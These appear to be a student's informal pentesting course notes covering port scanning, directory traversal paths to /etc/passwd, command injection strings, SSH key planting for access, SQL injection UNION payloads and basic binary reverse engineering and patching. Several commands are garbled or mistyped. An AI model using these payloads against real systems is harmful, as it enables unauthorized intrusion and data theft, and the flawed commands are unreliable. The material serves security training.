Ping Sweep command 

Port Scanning
nmap, nse (http-enum.nse,http-robots.txt.nse,banner.nse)
nikto -h 172.20.24.239

nmap -v -sT -T4 –script=http.robots.txt.nse

web exploitation
1.Directory Traversal – information
.././../../../../etc/passwd
.././../../../../etc/group
.././../../../../etc/hosts
.././../../../../etc/networks
.././../../../../etc/resolve.conf
.././../../../../etc/passwd

2. CMD Injection – Information/Access
; id
; whoami
; cat
;



ssh key upload

find the default home directory, for the user based off /etc/passwd

now we can generate the ssh public key, and we know where to put it

ssh-keygen -r rsa -b 4096

cat /home/student/.ssh/id_rsa.pub

echo that into the authorized hosts


malicious upload

can you upload?
can you excecute or access the area
are up laods being sanitized
can you access

ssh -i .ssh/id_rsa www-data@172.20.24.239



msfvenom -p windows/exec CMD'cmd.exe /C "whoami" > C:|Users

database of databases-hold meta data

colums = table, this table is in the information_schema

table_schema = column lists of databases

table_name = column lists out tables names

colum_name = column lists out column names

UNION select id,name,pass from session.user 



UNION select 1,2,@@version


determine behavior of page

determine if vulnerable via truth statement

determine how many colums exits(UNION select 1,2,3)

determine column number, order and what is hidden

dump the database using golden

extract information




reverse engineering

find a binary, you are curious

run file on it, what type of binary
srings on it


static analysisc
file, stings

behaviors analaysis 
run it and see what it does(what does normal look like)

ASCII compared to strings

windows exceutable, wat do we want to do
IDA or ghidra

gdb on linux with peda

first thing to start with
strings zero in on part of the program with the startup
look and see what the condition is(do this or that) 
figure out the variable or value
step into the function that returns a certain value
see the desired input to the program for it to be successful
test the math out

then move into patching a program in ghidra
find that IF statement write in the assembly above or below the if statement it will have a JMP, you can easily flip that and look at the psudocode and see everything change


run file on it, run strings, inteact with it, tkae note of how it runs and what normal looks like
start utiling gdb

if it calls for you to exploit a binary with a buffer overflow(gdb with ped) or immunity debugger

when you are reverse engineering it needs to take place on the host, the EIP will be different
gdb will prob be installed on the box
